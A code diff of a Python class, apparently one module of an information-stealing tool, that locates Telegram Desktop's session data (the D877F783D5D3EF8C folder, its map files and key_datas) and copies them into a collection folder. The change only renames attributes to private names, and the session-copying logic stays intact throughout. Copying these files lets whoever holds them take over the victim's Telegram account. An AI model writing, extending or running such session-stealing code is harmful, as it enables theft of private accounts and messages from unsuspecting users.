@@ -9,25 +9,26 @@ class Telegram:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
-        self.config = TelegramConfig()
-        self.storage_path = storage_path
-        self.folder = folder
-        self.errors = errors
+        self.__storage_path = storage_path
+        self.__folder = folder
+        self.__errors = errors
+
+        self.__config = TelegramConfig()
 
     def __create_folder(self):
 
-        folder = rf"{self.storage_path}\{self.folder}\D877F783D5D3EF8C"
+        folder = rf"{self.__storage_path}\{self.__folder}\D877F783D5D3EF8C"
 
         if not path.exists(folder):
             makedirs(folder)
 
     def __get_sessions(self):
 
-        if not path.exists(self.config.SessionsPath):
+        if not path.exists(self.__config.SessionsPath):
             return
 
-        folder = rf"{self.storage_path}\{self.folder}"
-        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.config.SessionsPath)], [])
+        folder = rf"{self.__storage_path}\{self.__folder}"
+        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.__config.SessionsPath)], [])
 
         if not sessions:
             return
@@ -37,14 +38,14 @@ class Telegram:
         sessions.remove("D877F783D5D3EF8C")
 
         for session in sessions:
-            copyfile(rf"{self.config.SessionsPath}\{session}", rf"{folder}\{session}")
+            copyfile(rf"{self.__config.SessionsPath}\{session}", rf"{folder}\{session}")
 
-        maps = sum([findall(r"map.*", file) for file in listdir(rf"{self.config.SessionsPath}\D877F783D5D3EF8C")], [])
+        maps = sum([findall(r"map.*", file) for file in listdir(rf"{self.__config.SessionsPath}\D877F783D5D3EF8C")], [])
 
         for map in maps:
-            copyfile(rf"{self.config.SessionsPath}\D877F783D5D3EF8C\{map}", rf"{folder}\D877F783D5D3EF8C\{map}")
+            copyfile(rf"{self.__config.SessionsPath}\D877F783D5D3EF8C\{map}", rf"{folder}\D877F783D5D3EF8C\{map}")
 
-        copyfile(rf"{self.config.SessionsPath}\key_datas", rf"{folder}\key_datas")
+        copyfile(rf"{self.__config.SessionsPath}\key_datas", rf"{folder}\key_datas")
 
     def run(self):
 
@@ -53,4 +54,4 @@ class Telegram:
             self.__get_sessions()
 
         except Exception as e:
-            if self.errors is True: print(f"[Telegram]: {repr(e)}")
+            if self.__errors is True: print(f"[Telegram]: {repr(e)}")
